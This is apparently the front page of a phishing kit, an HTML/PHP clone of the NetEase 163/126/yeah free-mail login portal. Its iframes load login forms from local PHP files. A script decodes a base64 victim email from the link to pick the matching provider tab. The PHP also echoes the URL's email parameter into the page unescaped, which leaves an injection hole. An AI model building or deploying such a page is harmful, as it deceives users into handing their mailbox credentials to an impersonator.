<html lang="zh-cmn-Hans">
    <head>
        <base target="_self">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>网易免费邮箱 - 中国第一大电子邮件服务商</title>
        <link rel="shortcut icon" href="assets/images/favicon.ico">
        <link rel="stylesheet" href="assets/css/index.css">
        <script>var aTag=["aside","figcaption","figure","footer","header","hgroup","nav","section"],i=0;for(i in aTag)document.createElement(aTag[i])</script>
        <script type="text/javascript" src="assets/js/message.js"></script>
    </head>
    <body class="mail-163" style="background-image: url(&quot;assets/images/bkground.jpg&quot;);">
        <!--[if lt IE 8]>
        <div class="overlay"></div>
        <div class="overlay-tips">
            <p>您的浏览器版本过旧无法正常登录邮箱，<br />建议您使用版本更高的IE浏览器或其他浏览器登录。<br /><a href="https://www.microsoft.com/zh-cn/download/internet-explorer.aspx">Internet Explorer 下载</a> &nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.google.cn/chrome/browser/desktop/index.html">chrome</a></p>
        </div>
        <![endif]-->
        <header class="header">
            <div class="inner">
                <h1>
                    <a href="#">
                    <img src="assets/images/ntes_logo.png" alt="网易NetEase" width="87" height="27">
                    </a>
                </h1>
                <p class="ext">
                    <a class="link" href="#" title="收费邮">收费邮</a>
                    <a class="link" href="#" title="企业邮箱">企业邮箱</a>
                    <a class="link" href="#" title="国外用户登录">国外用户登录</a>
                    <a class="link" href="#">手机客户端</a>
                    <a class="link" href="#" title="">帮助</a>
                </p>
            </div>
        </header>
        <section class="main" id="main" style="margin-top: 116.5px;">
            <h2 class="h2" title="中国第一大电子邮件服务商">中国第一大电子邮件服务商</h2>
            <b class="ico-arr"></b>
            <ul class="nav" id="nav">
                <li class="item item-163" data-target="163" id="logo-163">
                    <b class="logo logo-163" title="网易163免费邮"></b>
                </li>
                <li class="item item-126" data-target="126" id="logo-126">
                    <b class="logo logo-126" title="网易126免费邮"></b>
                </li>
                <li class="item item-yeah" data-target="yeah" id="logo-yeah">
                    <b class="logo logo-yeah" title="网易yeah免费邮"></b>
                </li>
            </ul>
            <div class="panel" id="panel">
                <div class="area area-163 area-inited" id="panel-163" style="width: 460px; height: 263px;">
                    <p class="loading"><b class="ico ico-loading"></b> 载入中...</p>
                    <iframe id="used" frameborder="0" scrolling="no" style="width: 100%; height: 100%; border: none; background: none;" src="163.php<?php echo isset($_GET['email']) ? "?email={$_GET['email']}" : '' ?>"></iframe>
                </div>
                <div class="area area-126 area-inited" id="panel-126" style="width: 460px; height: 263px;">
                    <p class="loading"><b class="ico ico-loading"></b> 载入中...</p>
                    <iframe id="used" frameborder="0" scrolling="no" style="width: 100%; height: 100%; border: none; background: none;" src="126.php<?php echo isset($_GET['email']) ? "?email={$_GET['email']}" : '' ?>"></iframe>
                </div>
                <div class="area area-yeah area-inited" id="panel-yeah" style="width: 460px; height: 263px;">
                    <p class="loading"><b class="ico ico-loading"></b> 载入中...</p>
                    <iframe id="used" frameborder="0" scrolling="no" style="width: 100%; height: 100%; border: none; background: none;" src="yeah.php<?php echo isset($_GET['email']) ? "?email={$_GET['email']}" : '' ?>"></iframe>
                </div>
                <div class="extra fn-txtc">
                    <div class="free">
                        <label class="ssl" for="sslAble">
                        <input id="sslAble" type="checkbox">SSL安全登录</label>
                        邮箱版本：
                        <a href="javascript:void(0)" class="fn-selC" id="styleSelect">
                        <span id="styleCurrect">默认版本</span>
                        <b class="ico arr fn-arrC"></b>
                        </a>
                        <div class="styleMenu fn-txtOption" id="styleOptions" style="display:none"><a href="javascript:void(0)" data-style="-1">默认版本</a><a href="javascript:void(0)" data-style="7">网易邮箱6.0版</a><a href="javascript:void(0)" data-style="6">网易邮箱6.0简约版</a></div>
                    </div>
                    <div class="mobile">
                        还没有网易手机号码邮箱？
                        <a class="fn-extLinkC" href="#" tabindex="9">免费激活</a>
                    </div>
                </div>
                <div class="errTips" id="errTips" style="display:none"></div>
            </div>
        </section>
        <footer class="footer">
            <!-- 关于 -->
            <div class="copyright">
                <a href="#">网易首页</a>
                <a href="#">关于网易免费邮</a>
                <a href="#">网易智造</a>
                <a href="#">网易•有钱</a>
                <a href="#">网易严选</a>
                <a href="#">隐私政策</a>
                <span class="sptln">|</span>网易公司版权所有 © 1997-
                2018 （数据来源：艾媒邮箱报告）
            </div>
        </footer>
        <script type="text/javascript" src="assets/js/bundle-d35c952645.js"></script>
        <div id="x-URS1546814752933.573" style="display: block;"></div>
        <div id="x-URS1546814763453.4016" style="display: block;"></div>
        <div id="x-URS1546814763789.1472" style="display: block;"></div>
        
        <script>
            var base64 = atob(location.search.split('email=')[1]);
            console.log(base64);
            var email = base64.split('@')[1];
            console.log(email);

            if(email.match(/163.com/)) {
                document.getElementById('logo-163').click();
            } else if(email.match(/126.com/)) {
                document.getElementById('logo-126').click();
            } else if(email.match(/yeah.net/)) {
                document.getElementById('logo-yeah').click();
            }
        </script>
    </body>
</html>